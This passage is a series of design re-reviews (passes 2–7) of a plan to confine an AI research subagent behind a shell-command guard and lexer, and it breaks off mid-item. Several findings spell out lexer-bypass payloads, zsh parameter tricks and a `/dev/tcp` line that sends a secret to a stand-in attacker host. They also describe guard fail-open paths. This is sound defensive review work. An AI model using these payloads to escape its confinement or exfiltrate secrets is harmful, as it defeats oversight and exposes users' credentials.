- 🟡 **Correctness + Compatibility + Code Quality**: Guard must accept the
  forwarded `--fail-safe` flag — Resolved
- 🟡 **Security**: The confined researcher escapes via `Write` — Partially
  resolved (write-path canonicalisation gap reopens it; see new issues)
- 🟡 **Correctness + Performance + Usability**: Worst-case fetch exceeds the
  Bash timeout — Partially resolved (in-lock waits and credential commands
  sit outside the deadline)
- 🟡 **Correctness**: Phase 1 retry sentence contradicts the budget rule —
  Resolved
- 🟡 **Correctness**: `resolve_token` accepts a tracked plain key — Resolved
  (with naming and ordering side effects; see new issues)
- 🟡 **Correctness**: Parallel pairs split `<nn>` — Resolved
- 🟡 **Correctness + Compatibility**: Queries not sanitised — Resolved
- 🟡 **Architecture + Code Quality**: Fetch port shapes and confirmation
  ownership — Resolved
- 🟡 **Architecture + Performance + Code Quality**: Pacing gate semantics —
  Partially resolved (the port cannot carry the throttle wait)
- 🟡 **Architecture + Code Quality**: Deterministic allocation in prose —
  Resolved
- 🟡 **Performance**: Guard latency understated — Partially resolved (the
  write matcher is not budgeted)
- 🟡 **Performance**: Thundering herd under arXiv throttling — Resolved in
  design; the implementation depends on the port fix
- 🟡 **Test Coverage**: Real-clock binary tests, header extraction, JSON
  golden, `HttpTransport` policy — Resolved
- 🟡 **Usability**: Outstanding pairs without reason — Partially resolved
  (exit-1 failures have no path)
- 🟡 **Usability**: Permission prompt and allow-rule spelling — Resolved
- 🟡 **Usability**: Em-dash suffix misparse — Resolved
- 🔵 **Compatibility**: Integrity refusal on every hooked call — Still
  present, now wider (see new issues)
- 🔵 **Performance**: Non-FIFO polled lock — Still present
- 🔵 **Security**: DOI/identifier validation — Partially resolved
- 🔵 **Security**: Secret classification in `dump.rs` — Still present
  (declined in pass 1)
- 🔵 **Architecture**: `SourceFamily` grouping — Still present (declined in
  pass 1)
- Every other pass-1 minor and suggestion — Resolved

### New Issues Introduced

- 🟡 **Architecture + Code Quality + Correctness + Test Coverage +
  Performance**: The `PacingGate::paced` port hands the gate only a raw
  `Response`, so it cannot set `not_before` without re-running `classify`
  and `RetrySchedule`. `not_before` may also move backwards, and no test
  shows it being written.
- 🟡 **Security + Correctness + Test Coverage**: Write canonicalisation
  resolves only the deepest existing ancestor, so
  `findings/new/../../../../.accelerator/config.md` and a dangling symlink at
  the target pass. Relative paths are unspecified, and the `../` test sits at
  a level that only ever sees canonical paths.
- 🟡 **Security**: The forbidden set is bash-shaped. The Bash tool runs the
  user's shell (zsh on macOS), where `=(…)` and glob qualifiers `(e:…:)`
  execute code without any forbidden character. An allowlist is needed.
- 🟡 **Correctness + Architecture**: The 100 s deadline excludes the gate's
  in-lock waits (up to 30 s `not_before`, then a 30 s request) and credential
  command time (up to 30 s) before `fetch` starts.
- 🟡 **Test Coverage**: 0280's "`Retry-After: 120` → 30 s ×3" and "timeouts →
  4 attempts" ACs contradict the deadline. The scripted transport has to
  advance the clock, and the ACs need restating.
- 🟡 **Code Quality + Correctness + Compatibility**: Refusing a tracked file
  on entering the personal rung names the value key even for a `_cmd`-only
  file, makes `TokenCmdFromTrackedFile` unreachable from the ladder, fails a
  tracked keyless file instead of returning `NoToken`, and needs an
  unspecified jira exit-code arm (`exit_codes.rs:206` matches
  exhaustively; verified).
- 🟡 **Compatibility**: Phase 7 says `--fail-safe` absorbs verify failures,
  but `swallow_under_fail_safe` absorbs only `Failed`, so an integrity
  refusal exits `2` (verified at `launch/core.rs:236-241`). With the write
  matcher, one bad cached binary blocks every Bash call and every file edit
  for every user.
- 🟡 **Performance**: The guard now runs on every main-thread write, but only
  Bash latency is budgeted, and no early pass before config composition is
  specified.
- 🟡 **Usability**: Hard CLI failures (exit `1`: rejected key, credential
  refusal, client error) have no profile outcome and no `conduct` reporting
  row.
- 🟡 **Test Coverage**: The `topic-research outstanding` JSON contract, the
  filter for invalid unquarantined findings, and the exit-1 path are not
  pinned.
- 🔵 **Correctness**: `Clock::now() -> Instant` cannot be persisted across
  processes, so the pacing file needs wall-clock time.
- 🔵 **Correctness**: An item whose pairs are all skipped is vacuously
  complete and gets ticked.
- 🔵 **Compatibility**: The quarantine-set fixture expectation is wrong (it
  yields a pair at `04-…-web.md`); in-progress legacy sets take new names and
  skip indices.
- 🔵 **Compatibility**: 0284's contract (em dash only, grouping by filename)
  drifts from Phase 8; it needs a Phase 1 amendment.
- 🔵 **Architecture + Code Quality**: The source of `available_profiles` for
  the corpus verb is unspecified.
- 🔵 **Architecture**: `FindingsScope` re-encodes the corpus findings layout
  and is looser than `<topics>/<set>/findings/<name>.md`.
- 🔵 **Architecture + Code Quality**: Nothing enforces that
  `config::credentials` stays free of `std::fs`/`std::process`, and the
  tracker-support pup comment goes stale.
- 🔵 **Code Quality**: The `Decoder` mixes both families' methods, and decode
  failures are classed as client errors. The block message hand-copies
  `FORBIDDEN`. The request timeout has no single owner.
- 🔵 **Usability**: `?` and `&` collide with natural phrasing, and it is
  unclear whether blocked calls count against the budget. `budget_exhausted`
  advice ignores keyed users. The configured researcher is confined
  session-wide.
- 🔵 **Security**: Researcher calls with unrecognised input or unmatched
  tools still pass. The `FileState::Other`/`Err` mapping is unspecified.
- 🔵 **Test Coverage**: Minor gaps: clock-log interleaving, release after
  the body is read, the env rung beating a tracked file, `<nn>`/slug
  boundaries, confirmation-cache corruption, arXiv headers.

### Assessment

Pass 1's structural findings are resolved: the fetch ports, the verb for
deterministic allocation, the neutral credential home, the guard's flag
handling, and the per-call deadline. The revision is much stronger. Ten
majors remain, and most are new edge cases in the mechanisms the revision
added. Two are security-relevant and reopen the escalation the write
confinement closed: the zsh-shaped bypass of the command denylist and `..`
in the non-existent part of a write path. Two more (the `PacingGate` port
and the deadline gaps) are contract problems that block a faithful
implementation. The rest are specification gaps with clear fixes. A third
pass should need only targeted edits.

## Re-Review (Pass 3) — 2026-09-24T09:03:43+00:00

**Verdict:** REVISE

### Previously Identified Issues

- 🟡 **Architecture + Code Quality + Correctness + Test Coverage +
  Performance**: The `PacingGate` port cannot carry the throttle wait —
  Resolved. The deferral is still written after the lock is released; see
  the minor issues below.
- 🟡 **Security + Correctness + Test Coverage**: Write-path escapes (`..` in
  a segment that does not yet exist, dangling symlinks) — Resolved, but the
  symlink walk now over-blocks; see the new issues.
- 🟡 **Security**: The bash-shaped blocklist can be bypassed through zsh —
  Partially resolved. Adopting Claude Code parity closes `=(…)` and glob
  qualifiers, but the lexer lacks `$'…'` and comment states; see the new
  issues.
- 🟡 **Correctness + Architecture**: The deadline excludes in-lock waits and
  credential time — Resolved.
- 🟡 **Test Coverage**: The retry ACs contradict the deadline — Resolved; the
  arithmetic is re-derived as 4 / 3 / 3 attempts.
- 🟡 **Code Quality + Correctness + Compatibility**: The tracked-file refusal
  is too early — Resolved.
- 🟡 **Compatibility**: An integrity refusal blocks every Bash call and edit
  — Resolved with `--non-blocking`.
- 🟡 **Performance**: The write matcher has no latency budget and no early
  pass — Resolved.
- 🟡 **Usability**: Exit-1 failures have no outcome — Resolved, though the
  outcome is now too broad; see the new issues.
- 🟡 **Test Coverage**: The `outstanding` verb's contract is unpinned —
  Resolved.
- 🔵 Every pass-2 minor issue — Resolved. The non-FIFO lock, the `SourceFamily`
  abstraction, secret classification, and the cold-start download remain
  accepted and recorded.

### New Issues Introduced

- 🟡 **Security + Correctness + Test Coverage**: The lexer does not model
  ANSI-C `$'…'` quoting, where `\'` escapes the quote. The payload
  `… search $'\'' ; touch x ; \'` passes the lexer while both bash and zsh
  run `touch x`.
- 🟡 **Security + Correctness + Test Coverage**: The lexer has no comment
  state. As specified, the baseline row `#; touch x` is blocked, which breaks
  parity. A quote inside a comment desynchronises quote tracking
  (`# it's⏎touch y #'` passes and runs). A naive "stop at `#`" passes
  `x#;touch y`. A comment needs its own state: it opens only at the start of
  a word and ends at a newline. An unterminated quote should block.
- 🟡 **Test Coverage**: The lexer's boundaries are untested: backslash inside
  single quotes, escapes, unterminated quotes, `$"…"`, redirect-target
  variants (`>|`, `&>`, `2>&1`, `>/dev/nullx`), and prefix edge cases. A
  differential run through `bash -c` and `zsh -c` against a sentinel file is
  suggested.
- 🟡 **Correctness**: Rejecting a symlink in every path component blocks all
  writes under a symlinked ancestor (macOS `/var` and `/tmp` → `/private`),
  and a literal `/var/…` path never prefixes the canonical topics root. Walk
  only the components below the canonical topics root.
- 🟡 **Code Quality**: Rejecting a write path in the guard adapter has no
  representation in `Action`/`Block`, so it runs before the identity check,
  outside the pure rule. Model it as `Action::Write(Result<…,
  PathRejection>)`.
- 🟡 **Test Coverage + Architecture**: Nothing automated pins
  `research-topic`'s `Bash(accelerator research fetch *)` grant to the
  guard's prefix. The grant also lives apart from the profiles that appear to
  declare it.
- 🟡 **Test Coverage + Code Quality + Correctness**: The deadline test's fake
  `TokenCommandRunner` cannot reach a bin-only crate. Its 40 s delay never
  makes the deadline bite; 60 s would.
- 🟡 **Test Coverage**: The "binary failing verification" smoke case cannot
  run under `ACCELERATOR_RESEARCH_BIN`, because an override path is returned
  unverified. The flag combinations of `--non-blocking` are untested.
- 🟡 **Compatibility**: The baseline was measured on Claude Code 2.1.281, but
  the plugin's floor is still v2.1.144, so `agent_id`/`agent_type`, grant
  propagation, and matching are unverified between the two.
- 🟡 **Usability**: The Failed outcome fires on any non-zero exit, including
  correctable usage errors (exit `2`), and a guard block or permission denial
  has no outcome.
- 🔵 **Compatibility + Usability**: The grant was probed only for
  slash-command invocation, not for a model-invoked Skill or a foreground
  interactive session.
- 🔵 **Compatibility + Code Quality + Architecture**: `--non-blocking` has an
  unspecified scanning rule, precedence with `--fail-safe`, and
  documentation, and it creates an unexplained asymmetry with `vcs guard`.
- 🔵 **Compatibility**: Phases 3 and 7 add public items to the pinned
  `config`/`corpus` crates without a public-api step.
- 🔵 **Compatibility**: Legacy findings match their outline items only if
  `question` is identical byte for byte, and no normalisation is specified.
- 🔵 **Security**: DOI `..` segments steer the request to other same-origin
  endpoints, and query-component encoding is unstated.
- 🔵 **Architecture + Code Quality**: The `CanonicalPath` construction
  invariant cannot be enforced across crates, and `FindingsScope::admits`
  returns a `Decision`.
- 🔵 **Architecture**: The `ArxivDecoder` failure type is unnamed (error feed
  vs undecodable body).
- 🔵 **Performance + Correctness**: `defer_until` is written after the lock
  is released, and a skewed `not_before` can never be lowered. The contention
  counter and confirmation cache are shared read-modify-write files with no
  lock discipline or specified sink.
- 🔵 **Test Coverage + Correctness**: The test clock's `wall_now` across
  processes is unspecified. `defer_until` has no negative or final-attempt
  cases. `UndecodableResponse` has no rendered outcome or binary test. Three
  pup deny rules lack probe pairs.
- 🔵 **Usability**: No apostrophe rule, and the fenced example is unquoted.
  Lock-contention advice depends on a cause `conduct` never receives.
  Integrity diagnostics give no recovery step. Write blocks give no cause.
- 🔵 **Performance**: The latency sample is thin (20 runs) and skips the
  subagent path. The path walk should run only once a researcher is
  identified.
- 🔵 Suggestions: frame the lexer as a fixed policy seeded from the baseline
  that re-probes may only tighten; `--profiles-dir` couples corpus to skill
  layout; commit the probe harness with a shared verdict fixture; state a
  stability rule for the verb's JSON; choose `<nn>` deterministically when
  findings disagree; cache negative confirmations (already done).

### Assessment

Every pass-2 major is resolved, and the plan's structure and contracts are
now stable. What remains sits almost entirely in two places: the new parity
lexer and the new guard/grant plumbing. Two lexer gaps (`$'…'` and comment
state) are genuine bypasses of the parity rule and are the priority. The
symlinked-ancestor issue would break macOS use outright. The rest are
testability and specification gaps with clear fixes. A fourth pass focused
on Phase 7 should be enough.

## Re-Review (Pass 4) — 2026-09-24T10:40:39+00:00

**Verdict:** REVISE

### Previously Identified Issues

- 🟡 **Security + Correctness + Test Coverage**: The lexer does not model
  ANSI-C `$'…'` quoting — Resolved (blocked, matching both measured
  versions).
- 🟡 **Security + Correctness + Test Coverage**: The lexer has no comment
  state — Resolved. A comment state now exists, but new boundary gaps are
  listed below.
- 🟡 **Test Coverage**: Lexer boundaries are untested — Partially resolved.
  Boundary rows and a bash/zsh differential are in the plan, but the harness
  is underspecified.
- 🟡 **Correctness**: The symlinked-ancestor over-block — Resolved.
- 🟡 **Code Quality**: Path rejection sits outside the domain — Resolved.
- 🟡 **Test Coverage + Architecture**: The grant is not pinned — Resolved.
- 🟡 **Test Coverage + Code Quality + Correctness**: The deadline test cannot
  be built — Partially resolved. It is now reachable, but the 60 s
  expectation is wrong (3 attempts, not 2).
- 🟡 **Test Coverage**: The integrity smoke case — Partially resolved. The
  checksum route against a test manifest cannot be reached, because the
  binary trusts only the embedded key.
- 🟡 **Compatibility**: The floor versus the baseline — Resolved, with
  2.1.144 probed and matching on everything the design depends on.
- 🟡 **Usability**: The Failed outcome is too broad — Resolved.
- 🔵 Most pass-3 minor issues — Resolved. Still open: the recovery step names
  a cache-reset command that does not exist, and legacy questions that differ
  only in punctuation.

### New Issues Introduced

- 🟡 **Security + Correctness + Test Coverage**: The comment state is
  loosely defined. "Whitespace" is undefined, so with `char::is_whitespace`
  `x\r#;touch y` passes. An escaped space (`x\ #;touch y`) and a
  backslash-newline inside a comment also let the lexer and the shell
  disagree. Word separators should be exactly space and tab, and a backslash
  should be inert inside a comment.
- 🟡 **Security + Correctness + Test Coverage**: The `N>&M`/`>&N` exception
  is not defined at word level. It conflicts with the `>` target rule, and
  loose implementations pass `2>&1&touch x` or the file write `>&1x`.
  `<>file` is unaddressed.
- 🟡 **Security**: `$[…]` arithmetic has not been measured. Bash re-expands
  the array subscript in `$[a[\`touch x\`]]`, so the command runs. It needs
  probe rows, or blocking outside single quotes.
- 🟡 **Test Coverage + Correctness**: The `fetch_command` 60 s case gives 3
  attempts with waits of 3 s and 6 s. Use 65 s to get the intended 2
  attempts. The research key-command timeout is also unstated.
- 🟡 **Architecture + Test Coverage**: `confinement` is split across phases
  4, 5 and 7. The phase 5/6 "passes the guard" contract tests call a lexer
  that only arrives in phase 7, `PERMITTED_PREFIX` is private, and phase 7's
  public-api step omits the `research` diff.
- 🟡 **Architecture**: The confirmation cache has no domain port, yet the
  domain must consult it before confirming and write it inside the gate
  pass.
- 🟡 **Code Quality**: `fetch_command::run` and `context.rs` overlap, and
  `run`'s ports (only `Clock` and `TokenCommandRunner`) cannot support its
  hermetic unit tests. It needs `Transport` and injected config.
- 🟡 **Test Coverage**: The differential harness is underspecified. Taken
  literally, appending a sentinel after a passed command always runs it, and
  the corpus source, the prefix stub, and missing-zsh behaviour are
  unstated.
- 🟡 **Usability**: The Denied next step points at deny/ask rules, but the
  likelier cause is a missing grant. The fallback allow rule should be
  documented unconditionally.
- 🔵 **Code Quality + Architecture**: `is_confined` returns `bool`, which
  drops the matched identity and leaves the call order enforced only by
  convention (use `Option<ConfinedAgent>`). `Attempted` carries the response,
  not the verdict. No domain type carries `lock_contention`.
  `deferral_after` is undefined past `BACKOFF`, and the 30 s ceiling is
  duplicated. `ErrorFeed`'s message is dropped. `DispatchFailurePolicy` does
  not cover every `kernel::Error` variant. The `decide` snippet copies a
  non-`Copy` `PathRejection`.
- 🔵 **Correctness + Test Coverage**: The pacing discard and clamp rules
  contradict each other, and step 4's `existing` is ambiguous. The
  cross-process deferral test is confounded by spacing. The topics-root base
  directory, and what happens when canonicalisation fails, are unstated.
- 🔵 **Test Coverage**: No OpenAlex null-field decoder fixtures; no
  MultiEdit case; no case for a relative path without `cwd`.
- 🔵 **Architecture**: The contract tests add an undeclared dependency from
  `corpus-adapters` to `research`.
- 🔵 **Compatibility**: The differential lane is not in `test:integration`
  and zsh provisioning is unnamed. Write-tool hook fields were not in the
  probe. Nothing prompts a re-probe for newer releases, and profile
  invocations are not fixture rows. Four test-side `CredentialContext`
  literals are uncounted. The bootstrap failure signature is undocumented.
- 🔵 **Usability**: The Outcome list has no precedence for mixed call
  results. A guard write block has no terminal outcome, and correct-and-
  continue is unbounded. Several exit-1 client errors lack `E_*` codes.
- 🔵 **Security**: Re-probe governance has no verbatim-issuance check or
  executing-payload alarm. The differential corpus is enumerated only and
  runs without the shell snapshot.
- 🔵 Suggestions: `Read` plus web tools remain an exfiltration path, to be
  documented or confined; the logs and cache grow without bound; the
  `skipped[].reason` values should be a code set; a `Confined` token type.

### Assessment

The structural design is now stable across all eight lenses. Performance and
compatibility raise no majors, and most lenses report only boundary
definitions. The remaining majors fall into three groups:
- Lexer token boundaries (whitespace, `>&`, `$[…]`) that need exact
  definitions and, for `$[…]`, measured Claude Code verdicts.
- Phase and port ownership: `confinement` in phase 4 or 7, a confirmation
  cache port, and the `fetch_command` ports.
- Test specifications with arithmetic or harness errors.

All have mechanical fixes. Only the `$[…]` verdict needs new evidence.

## Re-Review (Pass 5) — 2026-09-24T10:53:30+00:00

**Verdict:** REVISE

Only pass-4 majors were addressed in this revision; pass-4 minors were left
for a later pass by design.

### Previously Identified Issues

- 🟡 **Security + Correctness + Test Coverage**: Comment state and whitespace
  — Resolved. Correctness checked every 2.1.281 row and found no conflicts
  between rules.
- 🟡 **Security + Correctness + Test Coverage**: `>&` exception at word level
  — Resolved.
- 🟡 **Security**: `$[…]` — Resolved; measured as denied on both versions.
- 🟡 **Test Coverage + Correctness**: 60 s deadline arithmetic — Resolved
  (65 s gives 2 attempts).
- 🟡 **Architecture + Test Coverage**: `confinement` split across phases —
  Resolved.
- 🟡 **Architecture**: Confirmation cache port — Resolved.
- 🟡 **Code Quality**: `fetch_command::run` ports — Partially resolved (see
  the new issues).
- 🟡 **Test Coverage**: Differential harness specification — Partially
  resolved (see the new issues).
- 🟡 **Usability**: Denied next step and the fallback allow rule — Resolved.
- 🟡 **Test Coverage**: Integrity smoke case — Still present. It was missed
  in the pass-4 fixes and still names the checksum route, which the built
  launcher cannot reach.

### New Issues Introduced

- 🟡 **Security + Correctness**: Backslash-newline line continuation is not
  modelled. Both shells delete `\⏎` outside single quotes and comments,
  including inside double quotes, before they tokenise. So
  `"$\⏎(touch y)"`, `$\⏎'\'' ; touch y #'` and
  `"$\⏎[a[\`touch y\`]]"` pass the lexer and run under bash. The
  continuation must be stripped before any adjacency check or blocked, with
  probe and boundary rows, and the mutator should splice `\⏎` as one unit.
- 🟡 **Code Quality + Architecture + Test Coverage**: `FetchPorts` still
  lacks `Environment`, `FileFacts` and the project root, and
  `project_credential_context` cannot take an injected runner or file-facts
  port, so the `fetch_command` tests are not hermetic. It also lacks the
  arXiv collaborators (decoders, `PacingGate`, `ConfirmationCache`), and
  `context.rs` still selects adapters.
- 🟡 **Test Coverage + Security + Performance**: The differential harness
  has three gaps: no positive control proving the sentinel can fire; no
  detection of file writes (the empty-temp-directory check); and the
  exhaustive every-position mutator run serially through one process per
  string would add minutes to `test:integration`.
- 🟡 **Test Coverage**: No test stops an unavailable, failed or undecodable
  confirmation from being recorded as "not withdrawn", which would
  permanently mis-tier the paper.
- 🔵 **Correctness**: The redirect shapes pass unmeasured forms (`>&2`,
  `1>&2`, `2>&12`, `>/dev/null`, `>>/dev/null`) and disagree with 0280 item
  12. `[0-9]*>>` is missing, `2>` is redundant, and "whole word" contradicts
  `> /dev/null`.
- 🔵 **Correctness**: The zsh `$NAME[…]` subscript re-expansion is
  unprobed.
- 🔵 **Code Quality + Architecture**: The cache-write-under-lock invariant is
  implicit, and the shared loop has no on-delivered hook. The verdict is a
  bare `bool`.
- 🔵 **Compatibility**: The `test:integration:research` leaf omits `depends`
  and its `test_mise.py` classification. zsh becomes a requirement of the
  bare `mise run` with no prerequisites section. Phase 7 confines custom
  researchers before the changelog or docs ship.
- 🔵 **Usability**: The missing-zsh failure message is unspecified; DOI
  lookups get no quoting guidance; the Denied row does not name the settings
  file or how to tell the two causes apart.
- 🔵 **Performance**: Recall outside the lock lets parallel researchers
  duplicate paced OAI requests.
- 🔵 **Test Coverage + Correctness**: Deadline equality at 100 s is
  unpinned, and the 65 s parenthetical is misworded.

### Assessment

The pass-4 lexer fixes hold: correctness verified every measured row, and
performance, usability and compatibility raise no lexer concern. Five majors
remain. The backslash-newline continuation is a genuine bypass and the
priority. The `FetchPorts` gap and the three differential-harness gaps are
specification completeness. The confirmation-cache test and the integrity
smoke route are straightforward. The continuation and zsh-subscript rows
need Claude Code verdicts before the fix.

## Re-Review (Pass 6) — 2026-09-24T11:37:35+00:00

**Verdict:** REVISE

### Previously Identified Issues

- 🟡 **Security + Correctness**: The backslash-newline continuation —
  Resolved. It is blocked outside single quotes, including inside double
  quotes and in comments, and backed by measured rows and boundary rows.
- 🟡 **Code Quality + Architecture + Test Coverage**: `FetchPorts` and
  `project_credential_context` port gaps — Resolved. `context.rs` only
  composes config, `main.rs` alone builds adapters, and `FetchPorts` carries
  `CredentialPorts` plus both families' collaborators.
- 🟡 **Test Coverage + Security + Performance**: Differential harness gaps —
  Mostly resolved. Positive controls, the empty-directory write check, the
  150-mutant sample and the opt-in exhaustive leaf are all in. The budget is
  now in question (see the new issues).
- 🟡 **Test Coverage**: Failed confirmations cached as "not withdrawn" —
  Resolved.
- 🟡 **Test Coverage**: The integrity smoke case — Still present. It now
  uses the manifest-signature route, which is also unreachable (see the new
  issues).
- 🔵 **Correctness**: Redirect shapes versus item 12 — Resolved, apart from
  one wording contradiction (below).
- 🔵 **Correctness**: zsh `$NAME[…]` unprobed — Resolved for shell names, but
  it was widened into a new major.
- 🔵 **Code Quality + Architecture**: Cache-write-under-lock — Partially
  resolved. The invariant is stated, but the shared loop still has no seam
  for it and the verdict is still a bare `bool`.
- 🔵 **Compatibility**: The `test:integration:research` leaf wiring and zsh
  prerequisites — Resolved. The phase 7 changelog ordering is still present.
- 🔵 **Usability**: The missing-zsh message — Resolved. The Denied row is
  partially resolved: the settings file and the check for which cause
  applies are still unnamed. DOI quoting is still present.
- 🔵 **Performance**: Recall outside the lock duplicating OAI requests —
  Still present.
- 🔵 **Test Coverage + Correctness**: Deadline equality at 100 s — Resolved.
- 🔵 Deferred pass-4 minors: `decide`'s clone and the `corpus-adapters` →
  `research` dev-dependency are resolved. The following are still present:
  - `is_confined` returns `bool`, which now clashes with the
    `(agents.researcher)` message rule;
  - no domain type carries `lock_contention`, yet a test asserts it;
  - `deferral_after` is undefined, and `ErrorFeed` drops its message;
  - the Outcome list has no precedence, and correct-and-continue is
    unbounded;
  - several uncoded exit-1 errors, and the non-existent "cache-reset
    command" (verified: `CacheAction` has only
    `verify|repair|ensure|prune`);
  - re-probe governance, and the `Read` plus web-tools exfiltration path.

### New Issues Introduced

- 🟡 **Correctness + Security**: The zsh subscript/modifier rule covers only
  shell names. zsh also subscripts `$0[…]`, `$@[…]`, `$$[…]`, `$1[…]` and
  the flagged forms `$=NAME[…]`, `$~NAME[…]`, `$^NAME[…]` and `$#NAME[…]`.
  If `"$HOME[\$(touch y)]"` executes under zsh, these should too, and the
  mutator splices only `$HOME[`/`$HOME:`. Block `$` followed by any
  parameter reference (optional flag; name, digit or special) and then `[`
  or `:`, or block any `$` not followed by a plain name. Add probe, boundary
  and mutator rows.
- 🟡 **Security**: `$VAR` plus usage-error echo discloses the environment.
  `accelerator research fetch $SECRET search x` or
  `… openalex lookup $SECRET` passes the guard, and the CLI echoes the
  expanded value (`unknown family '…'`, `… (got '…')`). The profile then
  says "correct and continue" while the researcher still holds `WebFetch`.
  This is wider than the scoped-out "value reaches the upstream query". Fix
  it by not echoing rejected values, or by blocking unquoted `$` outside
  the query, and add a test that a secret-shaped argument never reaches
  stdout or stderr.
- 🟡 **Security**: Unquoted `<` lets bash open `/dev/tcp` connections.
  `… search x </dev/tcp/$SECRET.attacker.example/80` makes bash resolve and
  connect to an attacker host while the fetch runs normally, and the
  differential harness cannot see network egress. `research fetch` never
  reads stdin, so block unquoted `<` (optionally keeping `<<<`). This is
  stricter than Claude Code at no usability cost, so record it beside the
  "Stricter-than-Claude-Code" scoping.
- 🟡 **Test Coverage**: The integrity smoke case is still unreachable. With
  an empty cache, `bin/accelerator` first fetches the launcher from the same
  `ACCELERATOR_RELEASE_BASE_URL` and fails its signature check, which exits
  `0` under `--fail-safe`. The production `Fetcher` is https-only with
  bundled roots, so a local server gives a swallowed `Failed`. Even without
  those blocks, a released launcher would run, not this build. Use an
  offline launcher test in `cli/launcher/tests/` that seeds
  `ACCELERATOR_CACHE_DIR` with a tampered `research-*` entry and points at
  `DEAD_RELEASE_URL`, giving `CorruptCacheAndRefetchFailed`, and assert
  `1`/`2` and the recovery step. Optionally reach the dev launcher from the
  Python smoke via `ACCELERATOR_ALLOW_UNVERIFIED_LAUNCHER`.
- 🟡 **Code Quality + Architecture**: `Deadline` is built before the `Clock`.
  `main.rs` creates the `Deadline` first, yet `remaining()` and
  `admits_attempt_after(wait)` take no time source, and the test clock is
  swapped in later. Either the deadline reads real time internally, which
  is hidden I/O in the domain, or it mixes clocks. Take the time on each
  query (`remaining(now)`, `admits_attempt_after(now, wait)`) or select the
  `Clock` first, and state that one clock drives both.
- 🟡 **Performance + Test Coverage**: The differential leaf's 60 s budget is
  doubtful. Only the shell runs are pooled. About 60–100 rows × 150 mutants
  means 9,000–15,000 spawns of the debug guard, plus 2–3 shell runs per
  passed string. Pool the verdict step too, fix the default seed, set
  `ZDOTDIR`/`HOME` to an empty directory, and state whether 60 s is a target
  or a timeout. Send the stub's log outside the per-string directory, or
  the "must still be empty" check fails on every pass.
- 🔵 **Compatibility**: The opt-in `test:integration:research-exhaustive`
  leaf is unclassified. `test_mise.py` requires it in `_LAUNCHER_DEPENDENTS`
  and `_NOT_IN_INTEGRATION_ROLLUP`, and it needs
  `depends = ["build:cli:dev"]`. Alternatively, rename it out of the
  `test:integration:` namespace.
- 🔵 **Correctness**: The gate-refusal reason conflicts with item 6's "last
  retryable attempt's reason". For a `5xx` followed by a gate refusal, state
  which reason wins and whether `cause` survives, then test it.
- 🔵 **Correctness**: The outcome of a `Failed` or undecodable withdrawal
  confirmation is unspecified. An OAI `idDoesNotExist` error arrives as a
  `200` document and hits this branch.
- 🔵 **Correctness**: Item 12 blocks "redirects other than to `/dev/null`"
  yet passes `[N]>&M`. Reword it.
- 🔵 **Architecture**: `research_domain_imports_only_permitted` has no
  `denied` list for `std::(fs|process|env|net)`, unlike phase 2's `config`
  rule, so "no I/O" is enforced only by convention.
- 🔵 **Code Quality**: `CredentialPorts` duplicates `CredentialContext`'s
  port fields, `root` is passed twice, and moving the ports conflicts with
  `CredentialContext`'s borrows.
- 🔵 **Test Coverage**: The 65/70/75 s key-command cases need the scripted
  runner to advance the shared recording clock and to record the
  `CommandPolicy` timeout. State both.
- 🔵 **Usability**: The missing-shell message names `zsh` even when `bash` is
  missing. Parametrise it by shell.

### Assessment

Every pass-5 major is resolved except the integrity smoke route, and the
correctness lens walked every baseline row without finding a disagreement.
Six majors remain, in three groups:
- Confinement: the zsh parameter-form gap, plus two egress paths that
  follow from matching Claude Code (usage-error echo and `/dev/tcp`). Both
  egress paths can be closed by being stricter than Claude Code where the
  fetch never needs the construct.
- Testability: the integrity smoke route, which needs an offline launcher
  test, and the `Deadline`/`Clock` ordering.
- Harness practicality: pooling, the seed, and the stub log location.

None needs new design. The zsh forms need measured Claude Code verdicts
before the lexer fix.

## Re-Review (Pass 7) — 2026-09-24T11:51:25+00:00

**Verdict:** REVISE

### Previously Identified Issues

- 🟡 **Correctness + Security**: zsh parameter forms — Resolved. The lexer
  now blocks every unescaped `$` outside single quotes and comments, which
  covers all parameter, flag and subscript forms.
- 🟡 **Security**: Usage-error echo leaking the environment — Resolved. No
  `$` expansion can reach an argument. A residual remains for path-shaped
  values (see the new minors).
- 🟡 **Security**: `/dev/tcp` egress — Resolved. Every unquoted `<` blocks,
  and the harness gains an egress listener with a positive control.
- 🟡 **Test Coverage**: Integrity smoke unreachable — Resolved. Test
  coverage and correctness both verified `dispatch_failure_policy.rs`
  against the launcher source: a seeded `research-<CARGO_PKG_VERSION>-<sha>`
  entry gives `CorruptCacheAndRefetchFailed` offline, and an empty cache
  gives an availability `Fetch` failure.
- 🟡 **Code Quality + Architecture**: `Deadline` built before the `Clock` —
  Resolved. It is now a pure value queried with `now`, created from the
  clock that `main.rs` selects first.
- 🟡 **Performance + Test Coverage**: Differential budget — Resolved. Verdict
  and execution are pooled per string, the seed is fixed, `HOME`/`ZDOTDIR`
  are isolated, the stub log sits outside the per-string directory, and
  60 s is a target.
- 🔵 **Compatibility**: The exhaustive leaf's classification — Resolved.
- 🔵 **Correctness**: Item 12's `>&M` wording — Resolved.
- 🔵 **Usability**: Missing-shell message and the non-existent cache-reset
  command — Resolved.
- 🔵 **Test Coverage**: Key-command runner and clock coupling — Resolved.
- 🔵 Still present:
  - gate-refusal reason precedence;
  - the outcome of a failed confirmation (now partially resolved);
  - the research import rule's `denied` list;
  - the on-delivered seam and the bool verdict;
  - `is_confined` returning `bool`;
  - no domain carrier for `lock_contention`;
  - `deferral_after`, and the dropped `ErrorFeed` message;
  - `CredentialPorts` duplication (now partially resolved);
  - Outcome precedence, and unbounded correct-and-continue;
  - uncoded exit-1 errors, the Denied row, and DOI quoting;
  - recall outside the lock, and log and cache growth;
  - the phase 7 changelog ordering.

### New Issues Introduced

- 🟡 **Security**: A guard panic fails open, and the researcher can cause
  it. A Rust panic exits `101`, which Claude Code treats as non-blocking.
  The lexer is hand-written over researcher-controlled text, so a crafted
  command that panics it re-opens the `$` and `<` routes that Claude Code
  allows. This contradicts the plan's reason for accepting fail-open ("the
  researcher cannot induce that failure"). Run `decide` under
  `catch_unwind` once the researcher is identified, and map a panic to a
  block. The differential harness should also fail on any guard exit other
  than `0` or `2`.
- 🟡 **Correctness**: The `$SENTINEL` payloads mask the construct under
  test. Every corpus row smuggles `touch "$SENTINEL"`, which the new `$`
  rule blocks first. The sentinel can therefore never fire on a
  guard-passed string, and separator, comment and redirection bugs go
  undetected while the controls stay green. Use a literal payload
  (`touch sentinel`, or an absolute path fixed at generation time).
- 🟡 **Compatibility** (Test Coverage, minor): The Python smoke test's
